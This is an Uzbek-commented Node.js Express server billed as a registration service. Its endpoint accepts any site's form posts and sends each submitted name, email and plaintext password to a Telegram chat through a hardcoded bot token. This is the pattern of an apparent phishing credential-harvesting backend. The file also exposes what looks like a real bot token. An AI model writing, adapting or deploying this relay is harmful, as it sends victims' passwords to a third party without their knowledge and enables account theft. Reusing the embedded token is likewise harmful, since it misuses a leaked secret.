const express = require('express');
const axios = require('axios');
const bodyParser = require('body-parser');
const cors = require('cors');

// Telegram bot token va chat ID
const BOT_TOKEN = '6533123372:AAH2oArIC_jsN4M7549pvYHNWOPo6YtBxPI';
// CHAT_ID ni olish uchun @userinfobot ga yozing
const CHAT_ID = 'YOUR_CHAT_ID'; // O'zingizning chat ID'ingizni qo'ying

const app = express();

// Middleware
app.use(bodyParser.json());
app.use(cors({
    origin: '*', // Barcha domain'lardan so'rov qabul qilish
    methods: ['GET', 'POST']
}));

// Asosiy sahifa
app.get('/', (req, res) => {
    res.send('Ro\'yxatdan o\'tish serveri ishlamoqda!');
});

// Formani yuborish uchun API endpoint
app.post('/send-message', async (req, res) => {
    console.log('Yangi so\'rov qabul qilindi:', req.body);
    
    const { name, email, password } = req.body;

    // Ma'lumotlarni tekshirish
    if (!name || !email || !password) {
        return res.status(400).json({ 
            success: false, 
            error: 'Barcha maydonlarni to\'ldiring' 
        });
    }

    // Telegram API URL
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

    // Yuboriladigan xabar
    const message = `
🆕 Yangi ro'yxatga olish!

👤 Ism: ${name}
📧 Email: ${email}
🔐 Parol: ${password}
⏰ Vaqt: ${new Date().toLocaleString('uz-UZ')}
    `;

    try {
        console.log('Telegramga xabar yuborilmoqda...');
        
        // Telegramga xabar yuborish
        const telegramResponse = await axios.post(url, {
            chat_id: CHAT_ID,
            text: message,
            parse_mode: 'HTML'
        });
        
        console.log('Telegram javobi:', telegramResponse.data);
        
        // Ma'lumotlarni saqlash
        console.log('Yangi foydalanuvchi:', { 
            name, 
            email, 
            timestamp: new Date().toISOString() 
        });
        
        res.status(200).json({ 
            success: true, 
            message: 'Xabar muvaffaqiyatli yuborildi' 
        });
        
    } catch (error) {
        console.error('Xabar yuborishda xatolik:', error.response?.data || error.message);
        
        // Xatolikni aniqlash
        let errorMessage = 'Xabar yuborishda xatolik yuz berdi';
        
        if (error.response?.data?.description) {
            errorMessage = error.response.data.description;
        } else if (error.code === 'ENOTFOUND') {
            errorMessage = 'Internet aloqasi yo\'q';
        }
        
        res.status(500).json({ 
            success: false, 
            error: errorMessage 
        });
    }
});

// Noto'g'ri yo'llar uchun
app.use('*', (req, res) => {
    res.status(404).json({ 
        success: false, 
        error: 'Sahifa topilmadi' 
    });
});

// Serverni ishga tushirish
const port = process.env.PORT || 3000;
app.listen(port, '0.0.0.0', () => {
    console.log(`✅ Server ${port}-portda ishlamoqda`);
    console.log(`🌐 Server manzili: http://localhost:${port}`);
});